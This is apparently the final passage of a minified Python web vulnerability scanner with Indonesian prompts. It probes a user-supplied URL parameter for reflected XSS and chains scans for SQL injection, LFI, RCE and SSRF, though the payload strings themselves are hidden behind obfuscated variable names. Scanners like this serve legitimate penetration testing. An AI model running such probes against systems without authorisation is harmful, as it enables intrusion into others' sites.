	A.print('\n[INFO] Advanced XSS Scan',style=AZ);N=O('Masukkan URL target untuk XSS (tanpa parameter, misal: http://example.com/page.php): ').strip();P=O('Masukkan nama parameter untuk XSS (misal: q): ').strip();W=f"{N}?{P}=test";A.print(f"[INFO] Menggunakan URL: {W}",style=C);Q=[AT,AU,AV,AW,AX];S=[]
	for X in Q:M=f"{N}?{P}={E({H:X})[1:]}";S.append(B.create_task(F(M,session)))
	Y=await B.gather(*S,return_exceptions=I);R=[]
	for(T,U)in J(Y):
		M=f"{N}?{P}={E({H:Q[T]})[1:]}"
		if K(U,L):
			Z,V,a=U
			if Z==200 and V and Q[T].lower()in V.lower():A.print(f"[FOUND] Advanced XSS potential: {M}",style=G);R.append(M)
			else:A.print(f"[NOT FOUND] {M}",style=D)
	report['Advanced XSS']=R if R else[Aa]
async def B0():
	G='############################################################';F='bold green';A.clear();A.print(G,style=F);A.print('#            Next-Gen Web Security Scanner                 #',style=F);A.print('#   [ Gen Z Pentest Vibes - Stay Woke & Hack Ethically! ]    #',style=F);A.print(G,style=F)
	if len(sys.argv)>1:D=sys.argv[1]
	else:D=O('Masukkan URL target: ').strip()
	if not D.startswith('http'):D='http://'+D
	B={AB:[],AH:[],AQ:[],AR:[],AS:[],f:[],g:[],'XSS':[],'LFI':[],'RCE':[],'SSRF':[],AY:[]};H=Ab(total=15);I=Ac(ssl=e,limit=50)
	async with aiohttp.ClientSession(timeout=H,connector=I)as E:
		J,L=await Am(D,E)
		if J:
			await An(D,E,B);await Ao(D,E,B);await Ap(D,E,B);await Ar(D,E,B);await As(D,E,B);await At(D,E,B);await Au(D,E,B);await Av(D,E,B);await Aw(D,E,B);await Ax(D,E,B);await Ay(D,E,B,max_pages=10);b(B);c(B);K=O('Mau scan advanced SQL dan XSS? (y/n): ').strip().lower()
			if K=='y':await Az(E,B);await A_(E,B);b(B);c(B)
		else:A.print('[ERROR] Gagal terhubung ke target, scan dibatalkan.',style=P)
	A.print('\n[INFO] Scan selesai! Hack ethically and stay woke!',style=C)
if __name__=='__main__':
	try:B.run(B0())
	except KeyboardInterrupt:A.print('\n[INFO] Scan dihentikan oleh user.',style=D)
